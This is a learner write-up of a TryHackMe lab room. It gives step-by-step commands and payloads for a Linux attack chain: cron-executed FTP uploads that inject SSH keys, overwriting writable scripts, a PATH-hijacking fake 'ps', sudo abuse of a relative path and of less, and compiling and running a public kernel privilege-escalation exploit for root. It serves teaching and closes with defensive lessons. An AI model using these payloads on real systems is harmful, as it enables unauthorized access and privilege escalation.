# Jump: Learner Writeup

**Platform:** TryHackMe
**Room:** jump
**Category:** Linux Privilege Escalation / Lateral Movement
**Difficulty:** Medium
**Flags:** 5 (one per user: recon_user, dev_user, monitor_user, ops_user, root)

---

## What This Challenge Is About

A Linux server runs an internal automation pipeline: shell scripts get picked up by cron from an FTP drop zone, processed by different service accounts, and chained through a series of scheduled tasks. Each user account is siloed from the others, but the scripts those accounts run are poorly secured. Your job is to exploit each misconfiguration in turn, jumping from one account to the next until you reach root.

> **Real-world note:** This room has a known instance reliability issue. The `healthcheck` service (required for Phase 4) is inactive on roughly 2 in 10 deployed instances. This writeup covers both the intended attack chain and how to recover from a bad instance using the DirtyFrag kernel exploit (CVE-2026-43284) to restart the service and continue.

---

## Background Concepts (Read This First)

### What is anonymous FTP?

FTP (File Transfer Protocol) is an old file-sharing service. "Anonymous FTP" means the server accepts the username `anonymous` with any password. Files in world-writable directories can be uploaded by anyone without credentials.

### What is a cron job?

Cron is the Linux task scheduler. A cron entry like `* * * * *` means "every minute." Each user account can have its own cron jobs and they run as that user. If a cron job executes a script that you can overwrite, you can hijack what that script does.

### What is PATH hijacking?

When a script calls `ps` without a full path, Linux searches the directories listed in the `PATH` environment variable in order. If an attacker-controlled directory appears before `/bin` in PATH, a malicious script named `ps` in that directory runs instead of the real one.

### What is a relative path vulnerability?

A script that calls `./helper.sh` is calling a helper relative to the current directory. If you can write to that directory, you control what `helper.sh` does, even if the parent script itself is not writable.

### What is GTFOBins `less`?

`less` is a pager (a file viewer). When run as root via sudo, it can read any file on the system. The flags `-F` (quit if output fits on one screen) and `-X` (do not clear the screen on exit) make `less` behave like `cat`, printing the file and exiting immediately. No interactive session needed.

### What is DirtyFrag?

DirtyFrag (CVE-2026-43284 / CVE-2026-43500) is a Linux kernel local privilege escalation discovered in 2026. It abuses the in-place decryption path of the ESP (IPsec) and RxRPC subsystems. When a socket receives data via `splice(2)`, unprivileged processes can retain write access to kernel page-cache pages, giving them a write primitive into files they should not be able to modify. The public PoC patches `/usr/bin/su` in memory and uses it to spawn a root shell. It does not require a race condition and succeeds reliably on affected kernels.

---

## Phase 0: Check the VPN and Generate Your SSH Key

Before touching the target, confirm you have exactly one VPN connection active. Two simultaneous VPN sessions cause routing conflicts that make the target unreachable.

```
ip addr show | grep tun
```

Expected output (exactly one tun interface):
```
inet 192.168.128.64/18 scope global tun0
```

If you see `tun0` and `tun1`, kill one of the OpenVPN processes:

```
ps aux | grep openvpn
sudo kill <PID of duplicate>
```

Generate the SSH key pair you will use throughout this room. Using one key for all users keeps things simple.

```
ssh-keygen -t rsa -b 4096 -f ~/.ssh/id_rsa_jump -N ""
cat ~/.ssh/id_rsa_jump.pub
```

Copy the full output of that last command. You will need it in every subsequent phase.

---

## Phase 1: Reconnaissance

### 1.1 Port scan

Find out what services are listening on the target.

```
nmap -T4 -sV --open -p- <TARGET_IP>
```

Output (relevant ports):
```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.5
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.16
```

Two services: FTP and SSH. No web server. Our entry point is FTP.

### 1.2 Anonymous FTP enumeration

```
ftp -n <TARGET_IP>
```

At the `ftp>` prompt type:
```
user anonymous anonymous
ls -la
```

Output:
```
drwxrwxrwx    2 115  123  4096 incoming
drwxr-xr-x    5 115  123  4096 pub
```

The `incoming/` directory is world-writable. Explore further:

```
cd pub
ls -la
```

Output:
```
-rw-r--r--  1 0  0   139 README.txt
drwxr-xr-x  2 115  123  4096 archive
drwxrwxrwx  2 115  123  4096 incoming
drwxrwxrwx  2 115  123  4096 uploads
```

Download and read the README:

```
get README.txt /tmp/README.txt
quit
```

```
cat /tmp/README.txt
```

Output:
```
[ recon pipeline ]

All recon jobs must be placed in incoming/.
Files are processed automatically on arrival.
Invalid formats are ignored.
```

Key finding: shell scripts placed in `incoming/` are executed automatically by a cron job. The `pub/uploads/` directory is world-writable, giving us somewhere to write proof-of-execution output.

---

## Phase 2: Initial Access - Getting recon_user

### 2.1 Create and upload the payload

Write a shell script that installs your SSH public key into `recon_user`'s `authorized_keys`. Replace `YOUR_PUBLIC_KEY` with the full output of `cat ~/.ssh/id_rsa_jump.pub`.

```
cat > /tmp/recon_payload.sh << 'EOF'
#!/bin/bash
mkdir -p /home/recon_user/.ssh
chmod 700 /home/recon_user/.ssh
echo "YOUR_PUBLIC_KEY" >> /home/recon_user/.ssh/authorized_keys
chmod 600 /home/recon_user/.ssh/authorized_keys
id > /srv/ftp/pub/uploads/recon_id.txt
systemctl is-active healthcheck > /srv/ftp/pub/uploads/healthcheck_status.txt 2>&1
EOF
```

Upload it:

```
ftp -n <TARGET_IP> << 'EOF'
user anonymous anonymous
cd incoming
put /tmp/recon_payload.sh recon_payload.sh
quit
EOF
```

### 2.2 Wait for cron execution

The cron job runs every minute. Poll the uploads directory until the confirmation file appears:

```
until ftp -n <TARGET_IP> << 'FTPEOF' 2>/dev/null | grep -q "recon_id"; do
user anonymous anonymous
cd pub/uploads
ls
quit
FTPEOF
echo "Waiting..."; sleep 10
done
echo "Payload executed!"
```

Download the confirmation files:

```
ftp -n <TARGET_IP> << 'EOF'
user anonymous anonymous
get pub/uploads/recon_id.txt /tmp/recon_id.txt
get pub/uploads/healthcheck_status.txt /tmp/healthcheck_status.txt
quit
EOF
cat /tmp/recon_id.txt
cat /tmp/healthcheck_status.txt
```

Expected output:
```
uid=1001(recon_user) gid=1001(recon_user) groups=1001(recon_user),1002(dev_user),1005(devops)
active    <-- or "inactive" on a bad instance
```

Note the group memberships: `recon_user` is also in the `dev_user` group. This matters in Phase 3.

### 2.3 SSH in as recon_user and capture Flag 1

```
ssh -i ~/.ssh/id_rsa_jump recon_user@<TARGET_IP>
cat /home/recon_user/flag.txt
```

Output:
```
THM{REDACTED}
```

---

## Phase 2.5 (Recovery Only): DirtyFrag - Fix a Bad Instance

> **Skip this phase entirely if `healthcheck_status.txt` said `active`.** Only follow these steps if it said `inactive`.

The `healthcheck` service drives Phase 4 (PATH hijacking to reach `monitor_user`). Without it, the intended chain breaks. Rather than rerolling instances repeatedly, you can use the DirtyFrag kernel exploit to become root, start the service, then drop back to the intended chain.

### Why this works

The target runs kernel `6.17.0-1013-aws` on Ubuntu 24.04, which is vulnerable to CVE-2026-43284. DirtyFrag is a local privilege escalation; you already have a low-privilege shell as `recon_user`, which is enough.

### Step 1: Get the exploit source on your attack machine

```
git clone https://github.com/V4bel/dirtyfrag.git /tmp/dirtyfrag
```

### Step 2: Compile the exploit (cross-compile only if you are on ARM64)

Most pentesters run x86_64 Kali and can compile directly:

```
gcc -O0 -Wall -o /tmp/dirtyfrag/exp_x64 /tmp/dirtyfrag/exp.c -lutil -static
```

**ARM64 / aarch64 users only:** If your attack machine is ARM64 (run `uname -m` to check), you cannot run an x86_64 binary you compiled locally on the target. This is an uncommon setup, but it does come up. You need a cross-compiler instead:

```
# Install if missing
sudo apt install gcc-x86-64-linux-gnu

# Cross-compile for x86_64
x86_64-linux-gnu-gcc -O0 -Wall -o /tmp/dirtyfrag/exp_x64 /tmp/dirtyfrag/exp.c -lutil -static
```

Either way, verify the output is a static x86_64 binary before transferring:

```
file /tmp/dirtyfrag/exp_x64
```

Expected output:
```
ELF 64-bit LSB executable, x86-64, statically linked
```

### Step 3: Transfer to the target

```
scp -i ~/.ssh/id_rsa_jump /tmp/dirtyfrag/exp_x64 recon_user@<TARGET_IP>:/tmp/exp
```

### Step 4: Run the exploit and start healthcheck

The exploit spawns an interactive root shell via a patched `su` binary. To use it non-interactively over SSH, pipe the commands you want to run into it via `printf`:

```
ssh -i ~/.ssh/id_rsa_jump recon_user@<TARGET_IP> \
  "chmod +x /tmp/exp && printf 'systemctl start healthcheck\nsystemctl is-active healthcheck\nid\nexit\n' | /tmp/exp"
```

Expected output (after exploit noise):
```
root@tryhackme-2404:~# systemctl start healthcheck
root@tryhackme-2404:~# systemctl is-active healthcheck
active
root@tryhackme-2404:~# id
uid=0(root) gid=0(root) groups=0(root)
root@tryhackme-2404:~# exit
```

The service is now running. Continue from Phase 3.

> **Note on machine stability:** The exploit patches `su`'s page cache in memory. After running it, the SSH service may drop briefly. If your next SSH connection times out, wait 60 seconds and retry; the machine recovers on its own.

---

## Phase 3: Lateral Move to dev_user via Group-Writable Script

### 3.1 Understand the pivot

As `recon_user`, check your cron job and the `dev/` directory:

```
crontab -l
```

Output:
```
* * * * * /bin/bash /opt/recon/scan_uploads.sh
```

```
ls -la /opt/dev/
```

Output:
```
-rwxrwxr-x 1 dev_user dev_user 232 backup.sh
drwxr-xr-x 2 dev_user dev_user 4096 bin
```

`backup.sh` has `rwxrwxr-x` permissions. The group (`dev_user`) can write to it, and `recon_user` is in that group. `dev_user` has a cron job that runs this file every minute.

### 3.2 Overwrite backup.sh

Replace the full contents. Substitute your actual public key.

```
cat > /opt/dev/backup.sh << 'EOF'
#!/bin/bash
tar -czf /tmp/recon_backup.tgz /home/recon_user 2>/dev/null
mkdir -p /home/dev_user/.ssh
chmod 700 /home/dev_user/.ssh
echo "YOUR_PUBLIC_KEY" >> /home/dev_user/.ssh/authorized_keys
chmod 600 /home/dev_user/.ssh/authorized_keys
EOF
```

Wait up to one minute for the cron job to fire, then connect:

```
ssh -i ~/.ssh/id_rsa_jump dev_user@<TARGET_IP>
cat /home/dev_user/flag.txt
```

Output:
```
THM{REDACTED}
```

---

## Phase 4: Lateral Move to monitor_user via PATH Hijacking

### 4.1 Understand the pivot

As `dev_user`, inspect the `bin/` subdirectory and the healthcheck service:

```
ls -la /opt/dev/bin/
cat /opt/dev/bin/ps
```

There is a file named `ps` (the same name as the system process-listing command) and it is writable by `dev_user`. Check which service uses this directory:

```
systemctl cat healthcheck
```

Output:
```
[Unit]
Description=System Health Check

[Service]
Type=simple
User=monitor_user
Environment=PATH=/opt/dev/bin:/usr/local/bin:/usr/bin
ExecStart=/usr/local/bin/healthcheck
```

The service runs as `monitor_user` with `/opt/dev/bin` first in PATH. Check what the healthcheck script does:

```
cat /usr/local/bin/healthcheck
```

Output:
```bash
#!/bin/bash
echo "Running as: $(whoami)"
while true; do
  ps aux | grep -v grep
  sleep 5
done
```

It calls `ps` without a full path every five seconds. Our fake `ps` in `/opt/dev/bin/` will run as `monitor_user` instead.

### 4.2 Plant the malicious ps script

```
cat > /opt/dev/bin/ps << 'EOF'
#!/bin/bash
mkdir -p /home/monitor_user/.ssh
chmod 700 /home/monitor_user/.ssh
echo "YOUR_PUBLIC_KEY" >> /home/monitor_user/.ssh/authorized_keys
chmod 600 /home/monitor_user/.ssh/authorized_keys
/bin/ps "$@"
EOF
chmod +x /opt/dev/bin/ps
```

The script calls the real `/bin/ps` at the end so `healthcheck` keeps working normally.

Wait up to 60 seconds, then:

```
ssh -i ~/.ssh/id_rsa_jump monitor_user@<TARGET_IP>
cat /home/monitor_user/flag.txt
```

Output:
```
THM{REDACTED}
```

---

## Phase 5: Lateral Move to ops_user via Sudo + Relative Path

### 5.1 Check sudo rules

```
sudo -l
```

Output:
```
User monitor_user may run the following commands on tryhackme-2404:
    (ops_user) NOPASSWD: /usr/local/bin/deploy.sh
```

Read the script:

```
cat /usr/local/bin/deploy.sh
```

Output:
```bash
#!/bin/bash
cd /opt/app 2>/dev/null
./deploy_helper.sh
```

It changes into `/opt/app` and calls `./deploy_helper.sh` using a relative path. Check the directory:

```
ls -la /opt/app/
```

Output:
```
drwxrwxr-x 2 monitor_user monitor_user 4096 data
-rwxr-xr-x 1 monitor_user monitor_user   90 deploy_helper.sh
```

`deploy_helper.sh` is owned and writable by `monitor_user`. We control what it does.

### 5.2 Overwrite deploy_helper.sh and trigger sudo

```
cat > /opt/app/deploy_helper.sh << 'EOF'
#!/bin/bash
mkdir -p /home/ops_user/.ssh
chmod 700 /home/ops_user/.ssh
echo "YOUR_PUBLIC_KEY" >> /home/ops_user/.ssh/authorized_keys
chmod 600 /home/ops_user/.ssh/authorized_keys
EOF
chmod +x /opt/app/deploy_helper.sh
sudo -u ops_user /usr/local/bin/deploy.sh
```

Then connect:

```
ssh -i ~/.ssh/id_rsa_jump ops_user@<TARGET_IP>
cat /home/ops_user/flag.txt
```

Output:
```
THM{REDACTED}
```

---

## Phase 6: Root via sudo less

### 6.1 Check sudo rules

```
sudo -l
```

Output:
```
User ops_user may run the following commands on tryhackme-2404:
    (root) NOPASSWD: /usr/bin/less
```

### 6.2 Read the root flag

`less` run as root can read any file. The `-F` flag exits immediately if the content fits on one screen; `-X` keeps the output visible after exit. Together they turn `less` into a non-interactive file reader.

```
sudo /usr/bin/less -FX /root/flag.txt
```

Output:
```
THM{REDACTED}
```

---

## Full Attack Chain

```
Anonymous FTP write access (incoming/ is world-writable)
  -> upload shell script
       -> recon_user cron picks it up (every 1 min)
            -> SSH key injected for recon_user
                 -> Flag 1

[If healthcheck service is inactive (bad instance recovery):]
  -> DirtyFrag (CVE-2026-43284): cross-compile x86_64 binary on attack machine
       -> scp to target
            -> pipe commands into exploit root shell
                 -> systemctl start healthcheck
                      -> service now active, continue intended chain

recon_user is in dev_user group
  -> /opt/dev/backup.sh is group-writable
       -> dev_user cron runs backup.sh (every 1 min)
            -> SSH key injected for dev_user
                 -> Flag 2

dev_user owns /opt/dev/bin/ps (writable)
  -> healthcheck.service has PATH=/opt/dev/bin:...
       -> healthcheck calls bare 'ps' every 5 sec as monitor_user
            -> fake ps runs, injects SSH key for monitor_user
                 -> Flag 3

monitor_user: sudo -u ops_user /usr/local/bin/deploy.sh (NOPASSWD)
  -> deploy.sh: cd /opt/app && ./deploy_helper.sh (relative path)
       -> /opt/app/deploy_helper.sh is owned by monitor_user
            -> overwrite it, trigger sudo
                 -> SSH key injected for ops_user
                      -> Flag 4

ops_user: sudo /usr/bin/less (NOPASSWD, runs as root)
  -> less -FX /root/flag.txt
       -> Flag 5
```

---

## Tools Used

| Tool | Purpose in this room |
|------|---------------------|
| nmap | Identified FTP and SSH as the only open services |
| ftp | Explored anonymous FTP and uploaded the initial payload |
| ssh-keygen | Generated one RSA key pair reused across all five accounts |
| scp | Transferred the DirtyFrag binary to the target |
| x86_64-linux-gnu-gcc | Cross-compiled the exploit from ARM64 attack machine to x86_64 target |
| git | Cloned the DirtyFrag PoC from GitHub |
| ssh | Connected to each user account after key injection |
| sudo -l | Revealed NOPASSWD rules at each privilege level |
| systemctl cat | Showed the PATH configuration inside healthcheck.service |
| less -FX | Read the root flag without needing a shell |

---

## Takeaways

**Lesson 1: World-writable FTP directories that feed a script executor are remote code execution.**
The `incoming/` directory was writable by anyone. A cron job ran every `.sh` file dropped there as `recon_user`. This is equivalent to leaving an open web shell upload endpoint: anyone who can write to the directory can run code as that user.

**Lesson 2: Group memberships create implicit write paths between accounts.**
`recon_user` was added to the `dev_user` group for legitimate shared resource access. That same membership granted write access to `backup.sh`, which ran under `dev_user`'s cron. Shared group write access to executable scripts violates least privilege.

**Lesson 3: PATH order in service unit files is a security boundary.**
`healthcheck.service` explicitly set `PATH=/opt/dev/bin:/usr/local/bin:/usr/bin`. Placing an attacker-controlled directory before system directories means any unqualified binary name in the service's scripts is a potential hijack target. Always use full absolute paths in scripts that run under a service account.

**Lesson 4: Relative paths in sudo-allowed scripts are privilege escalation vectors.**
`deploy.sh` called `./deploy_helper.sh` after `cd /opt/app`. The sudoers entry allowed the parent script without verifying that its dependencies were also protected. If a sudo-allowed script calls anything in a writable directory, the privilege boundary is broken.

**Lesson 5: sudo over a pager is a root file read.**
`sudo less` is in GTFOBins because it reads any file as root. When auditing sudoers rules, consider what data a command can access, not only whether it can spawn a shell.

**Lesson 6: Architecture matters when cross-compiling exploits.**
If your attack machine is ARM64 (aarch64) and your target is x86_64, a locally compiled binary will not run on the target. Always check `uname -m` on both machines and use a cross-compiler (`x86_64-linux-gnu-gcc`) or a pre-built static binary for the target architecture.


